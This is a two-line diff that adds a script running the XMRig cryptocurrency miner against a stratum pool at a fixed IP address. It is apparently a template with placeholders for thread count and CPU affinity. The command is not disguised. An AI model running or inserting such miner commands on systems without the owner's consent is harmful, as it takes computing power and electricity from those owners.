@@ -1,0 +1,2 @@
+cd ~/xmrig
+./xmrig -o stratum+tcp://136.243.60.144:3333 -t #{@threads} #{affinity} --av 1 --nicehash
